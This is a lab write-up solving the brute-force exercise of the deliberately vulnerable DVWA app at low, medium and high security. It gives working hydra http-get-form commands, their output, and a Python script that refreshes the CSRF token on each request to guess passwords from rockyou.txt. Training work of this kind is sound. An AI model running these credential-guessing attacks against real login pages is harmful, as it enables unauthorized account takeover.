# Brute Force


The goal is to brute force an HTTP login page.

**Security level is currently: low.**

On submitting the username and password we see that it is using get request 

<img width="477" alt="image" src="https://user-images.githubusercontent.com/79740895/185153021-af373095-102b-4d68-88c7-573499351bc5.png">

So let’s use hydra for brute force:

``` 
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
```

Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page.

<!-- {::options parse_block_html="true" /}  -->

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-17 23:50:56
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-17 23:51:59

```
  
</details>

<!-- {::options parse_block_html="false" /} -->

Login credentials found by hydra:
`admin:password`

<br/>

**Security level is currently: medium.**


It is still using get request.

so lets use hydra again:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
```
it still work but this time attack takes significantly longer then before.

on analyzing the login functionality we notice that the response is delayed by 2 or 3 seconds on wrong attempt.

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 09:17:45
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 09:18:50

```
  
</details>

<br/>

**Security level is currently: high.**

It's still get request but this time one additional parameter `user_token`

It's using CSRF token so hydra wont help, let's use python this time.

<details><summary markdown="span">Click to see python code :diamond_shape_with_a_dot_inside: </summary>
  
```python
import requests
from bs4 import BeautifulSoup
from requests.structures import CaseInsensitiveDict

url = 'http://127.0.0.1/vulnerabilities/brute/'

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=high; PHPSESSID=j422143437vlsdgqs0t1385420"

r = requests.get(url, headers=headers)

r1 = r.content
soup = BeautifulSoup(r1, 'html.parser')
user_token = soup.findAll('input', attrs={'name': 'user_token'})[0]['value']
  
with open("/usr/share/wordlists/rockyou.txt", 'rb') as f:
    for i in f.readlines():
        i = i[:-1]
        try:
            a1 = i.decode()
        except UnicodeDecodeError:
            print(f'can`t decode {i}')
            continue

        r = requests.get(
            f'http://127.0.0.1/vulnerabilities/brute/?username=admin&password={a1}&Login=Login&user_token={user_token}#',
            headers=headers)
        r1 = r.content
        soup1 = BeautifulSoup(r1, 'html.parser')
        user_token = soup1.findAll('input', attrs={'name': 'user_token'})[0]['value']
        print(f'checking {a1}')
        if 'Welcome' in r.text:
            print(f'LoggedIn: username: admin , password:{a1}   ===found===')
            break
```
  
</details>

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $python brute_high.py 
checking 123456
checking 12345
checking 123456789
checking password
LoggedIn: username: admin , password:password   ===found===
```
  
</details>

<br/>
